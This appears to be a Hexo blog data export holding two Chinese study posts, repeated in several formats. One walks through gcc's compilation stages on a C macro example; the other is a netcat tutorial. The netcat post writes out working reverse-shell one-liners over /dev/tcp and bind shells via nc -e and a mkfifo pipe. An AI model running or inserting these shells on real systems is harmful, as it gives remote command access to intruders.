src=\"/images/compile.png\" alt=\"compile\"><br>接下来我们键入<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -E mocro_define.c -o mocro_define.i</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_E.png\" alt=\"define_E\"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>\n<h1 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -S mocro_define.i -o mocro_define.s -masm=intel</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_S.png\" alt=\"define_S\"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src=\"/images/define_S_main.png\" alt=\"define_S_main\"></p>\n<h1 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -c mocro_define.s -o mocro_define.o</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_c.png\" alt=\"define_c\"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>\n<h1 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h1><p>键入以下命令并执行可执行程序：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc mocro_define.o -o mocro_define</div><div class=\"line\">./mocro_define</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_o.png\" alt=\"define_o\"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>\n","excerpt":"","more":"<blockquote>\n<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>\n</blockquote>\n<hr>\n<h1 id=\"gcc编译过程分析\"><a href=\"#gcc编译过程分析\" class=\"headerlink\" title=\"gcc编译过程分析\"></a>gcc编译过程分析</h1><p><img src=\"/images/gcc_program.png\" alt=\"gcc_program\"></p>\n<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> F(x) ((x)*(x))</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">4</span>;</div><div class=\"line\">\t<span class=\"comment\">//printf(\"%d\\n\", F(++a));</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, F(a++));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img src=\"/images/compile.png\" alt=\"compile\"><br>接下来我们键入<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -E mocro_define.c -o mocro_define.i</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_E.png\" alt=\"define_E\"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>\n<h1 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -S mocro_define.i -o mocro_define.s -masm=intel</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_S.png\" alt=\"define_S\"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src=\"/images/define_S_main.png\" alt=\"define_S_main\"></p>\n<h1 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -c mocro_define.s -o mocro_define.o</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_c.png\" alt=\"define_c\"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>\n<h1 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h1><p>键入以下命令并执行可执行程序：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc mocro_define.o -o mocro_define</div><div class=\"line\">./mocro_define</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_o.png\" alt=\"define_o\"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>\n"},{"title":"NetCat","date":"2016-08-26T06:17:46.000Z","_content":"\n参考资料:\n[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)\n[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)\n[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)\n[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)\n\n---\n\n# 1. nc能干啥？\n能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件....  \nnetcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在\\*nix系统的shell中键入`man nc`查看手册．这里建议先好好学习一下Linux系统中管道(| > < >> <<等)的用法以及文件描述符的相关知识．\n\n---\n# 2. 栗子:\n扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．\n## 1. 聊天:\n我先在终端用ssh连接到一台Linux主机，然后键入`nc -l 8888`在远程机器的本地进行监听，然后在本机再开一个终端键入`nc -n 10.128.54.118 8888`即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为\"0.0.0.0\",表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.\n![nc_liaotian](/images/nc_liaotian.png)\n\n## 2.监听和反弹shell(reverse shell)\n先在一台主机shell环境中键入`nc -l -v -p 8888`,然后在另外一台主机中键入`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在\\*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,`>`后面加上`&`表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流`>`重定向到了网络上，然后后面的`0>&1`表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.\n![Reverse_shell](/images/nc_reverse_shell.png)\n关于反弹shell的代码网络上有很多，比如[这里](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:\n```bash\n$exec 3<>/dev/tcp/10.128.54.118/8888#创建3号文件描述符绑定到一个读写的网络连接\n$cat <&3 | while read line; do $line >&3 2>&1; done#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．\n```\n\n\n## 3. 连接监听的shell(bind shell)\n在Server端：\n```bash\n$nc -l port -e /bin/bash -i\n```\n在Client端：\n```bash\n$nc server_ip port \n```\n一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:\n```bash\n$mkfifo /tmp/tmp_fifo\n$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo\n```\n![bind_shell](/images/nc_bind_shell.png)\n\n## 4. 传送文件\n说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．\n\nSender:\n```bash\n$nc -l Port < file\n```\n\nReceiver:\n```bash\n$nc IP Port > file\n```\n![file_send](/images/nc_file_send.png)\n当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．\n\n---\n\n# 3. 总结\n对于\\*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下...\n","source":"_posts/netcat简述.md","raw":"---\ntitle: NetCat\ndate: 2016-08-26 14:17:46\ntags:\n- network security\n- shell\n- pipe\ncategories:\n- study\n---\n\n参考资料:\n[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)\n[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)\n[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)\n[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)\n\n---\n\n# 1. nc能干啥？\n能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件....  \nnetcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在\\*nix系统的shell中键入`man nc`查看手册．这里建议先好好学习一下Linux系统中管道(| > < >> <<等)的用法以及文件描述符的相关知识．\n\n---\n# 2. 栗子:\n扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．\n## 1. 聊天:\n我先在终端用ssh连接到一台Linux主机，然后键入`nc -l 8888`在远程机器的本地进行监听，然后在本机再开一个终端键入`nc -n 10.128.54.118 8888`即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为\"0.0.0.0\",表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.\n![nc_liaotian](/images/nc_liaotian.png)\n\n## 2.监听和反弹shell(reverse shell)\n先在一台主机shell环境中键入`nc -l -v -p 8888`,然后在另外一台主机中键入`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在\\*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,`>`后面加上`&`表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流`>`重定向到了网络上，然后后面的`0>&1`表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.\n![Reverse_shell](/images/nc_reverse_shell.png)\n关于反弹shell的代码网络上有很多，比如[这里](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:\n```bash\n$exec 3<>/dev/tcp/10.128.54.118/8888#创建3号文件描述符绑定到一个读写的网络连接\n$cat <&3 | while read line; do $line >&3 2>&1; done#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．\n```\n\n\n## 3. 连接监听的shell(bind shell)\n在Server端：\n```bash\n$nc -l port -e /bin/bash -i\n```\n在Client端：\n```bash\n$nc server_ip port \n```\n一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:\n```bash\n$mkfifo /tmp/tmp_fifo\n$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo\n```\n![bind_shell](/images/nc_bind_shell.png)\n\n## 4. 传送文件\n说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．\n\nSender:\n```bash\n$nc -l Port < file\n```\n\nReceiver:\n```bash\n$nc IP Port > file\n```\n![file_send](/images/nc_file_send.png)\n当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．\n\n---\n\n# 3. 总结\n对于\\*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下...\n","slug":"netcat简述","published":1,"updated":"2016-11-14T02:56:11.071Z","_id":"civhnccvx000dg8ua6u301mdh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>参考资料:<br><a href=\"http://netcat.sourceforge.net/\" target=\"_blank\" rel=\"external\">http://netcat.sourceforge.net/</a><br><a href=\"http://www.gnucitizen.org/blog/reverse-shell-with-bash/\" target=\"_blank\" rel=\"external\">gnucitizen.org</a><br><a href=\"http://www.oschina.net/translate/linux-netcat-command\" target=\"_blank\" rel=\"external\">http://www.oschina.net/translate/linux-netcat-command</a><br><a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"external\">Reverse shell</a><br><a href=\"https://joncraton.org/blog/46/netcat-for-windows/\" target=\"_blank\" rel=\"external\">NetCat for windows</a></p>\n<hr>\n<h1 id=\"1-nc能干啥？\"><a href=\"#1-nc能干啥？\" class=\"headerlink\" title=\"1. nc能干啥？\"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>\n<hr>\n<h1 id=\"2-栗子\"><a href=\"#2-栗子\" class=\"headerlink\" title=\"2. 栗子:\"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>\n<h2 id=\"1-聊天\"><a href=\"#1-聊天\" class=\"headerlink\" title=\"1. 聊天:\"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src=\"/images/nc_liaotian.png\" alt=\"nc_liaotian\"></p>\n<h2 id=\"2-监听和反弹shell-reverse-shell\"><a href=\"#2-监听和反弹shell-reverse-shell\" class=\"headerlink\" title=\"2.监听和反弹shell(reverse shell)\"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src=\"/images/nc_reverse_shell.png\" alt=\"Reverse_shell\"><br>关于反弹shell的代码网络上有很多，比如<a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"external\">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class=\"comment\">#创建3号文件描述符绑定到一个读写的网络连接</span></div><div class=\"line\"><span class=\"variable\">$cat</span> &lt;&amp;3 | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line; <span class=\"keyword\">do</span> <span class=\"variable\">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class=\"keyword\">done</span><span class=\"comment\">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-连接监听的shell-bind-shell\"><a href=\"#3-连接监听的shell-bind-shell\" class=\"headerlink\" title=\"3. 连接监听的shell(bind shell)\"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> port <span class=\"_\">-e</span> /bin/bash -i</div></pre></td></tr></table></figure></p>\n<p>在Client端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> server_ip port</div></pre></td></tr></table></figure></p>\n<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$mkfifo</span> /tmp/tmp_fifo</div><div class=\"line\"><span class=\"variable\">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc <span class=\"_\">-l</span> port &gt; /tmp/tmp_fifo</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_bind_shell.png\" alt=\"bind_shell\"></p>\n<h2 id=\"4-传送文件\"><a href=\"#4-传送文件\" class=\"headerlink\" title=\"4. 传送文件\"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>\n<p>Sender:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> Port &lt; file</div></pre></td></tr></table></figure></p>\n<p>Receiver:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> IP Port &gt; file</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_file_send.png\" alt=\"file_send\"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>\n<hr>\n<h1 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3. 总结\"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>\n","excerpt":"","more":"<p>参考资料:<br><a href=\"http://netcat.sourceforge.net/\">http://netcat.sourceforge.net/</a><br><a href=\"http://www.gnucitizen.org/blog/reverse-shell-with-bash/\">gnucitizen.org</a><br><a href=\"http://www.oschina.net/translate/linux-netcat-command\">http://www.oschina.net/translate/linux-netcat-command</a><br><a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">Reverse shell</a><br><a href=\"https://joncraton.org/blog/46/netcat-for-windows/\">NetCat for windows</a></p>\n<hr>\n<h1 id=\"1-nc能干啥？\"><a href=\"#1-nc能干啥？\" class=\"headerlink\" title=\"1. nc能干啥？\"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>\n<hr>\n<h1 id=\"2-栗子\"><a href=\"#2-栗子\" class=\"headerlink\" title=\"2. 栗子:\"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>\n<h2 id=\"1-聊天\"><a href=\"#1-聊天\" class=\"headerlink\" title=\"1. 聊天:\"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src=\"/images/nc_liaotian.png\" alt=\"nc_liaotian\"></p>\n<h2 id=\"2-监听和反弹shell-reverse-shell\"><a href=\"#2-监听和反弹shell-reverse-shell\" class=\"headerlink\" title=\"2.监听和反弹shell(reverse shell)\"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src=\"/images/nc_reverse_shell.png\" alt=\"Reverse_shell\"><br>关于反弹shell的代码网络上有很多，比如<a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class=\"comment\">#创建3号文件描述符绑定到一个读写的网络连接</span></div><div class=\"line\"><span class=\"variable\">$cat</span> &lt;&amp;3 | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line; <span class=\"keyword\">do</span> <span class=\"variable\">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class=\"keyword\">done</span><span class=\"comment\">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-连接监听的shell-bind-shell\"><a href=\"#3-连接监听的shell-bind-shell\" class=\"headerlink\" title=\"3. 连接监听的shell(bind shell)\"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：<br><figure class=\"highlight 